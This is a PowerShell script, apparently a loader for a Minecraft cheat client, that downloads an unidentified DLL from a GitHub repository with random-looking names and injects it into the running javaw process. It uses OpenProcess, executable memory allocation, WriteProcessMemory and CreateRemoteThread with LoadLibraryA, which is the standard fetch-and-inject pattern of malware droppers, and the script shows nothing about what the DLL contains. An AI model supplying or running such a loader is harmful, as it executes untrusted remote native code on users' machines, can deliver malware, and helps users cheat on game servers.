$dllUrl = "https://github.com/dsdfdcvdcwcwcdw/dsadsadasdsaadasdsa/raw/main/krytregii.dll"
$dllPath = "$env:TEMP\kryt_sys.dll"
$procName = "javaw"

# Clean up to prevent file-in-use errors
Remove-Item "$env:TEMP\kryt_*.dll" -ErrorAction SilentlyContinue

Write-Host "Fetching Kryt from dsadsadasdsa repo..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

$s = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint p);
[DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint s, IntPtr sa, IntPtr p, uint c, IntPtr tid);
'@

$k = Add-Type -MemberDefinition $s -Name "W32" -Namespace "K" -PassThru
$p = Get-Process $procName -ErrorAction SilentlyContinue

if (!$p) { Write-Host "Minecraft not found!"; pause; exit }

$h = $k::OpenProcess(0x1F0FFF, $false, $p.Id)
$l = $k::GetProcAddress($k::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$m = $k::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$dllPath.Length, 0x3000, 0x40)
$b = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
$o = 0
$k::WriteProcessMemory($h, $m, $b, [uint32]$b.Length, [ref]$o)

# This delay prevents the "Instant Crash" on OptiFine M5
Write-Host "Injection pending... Stay still in-game." -ForegroundColor Yellow
Start-Sleep -Seconds 4 

$k::CreateRemoteThread($h, [IntPtr]::Zero, 0, $l, $m, 0, [IntPtr]::Zero)
Write-Host "Kryt Loaded! Onlyfans SG Gods Active." -ForegroundColor Green
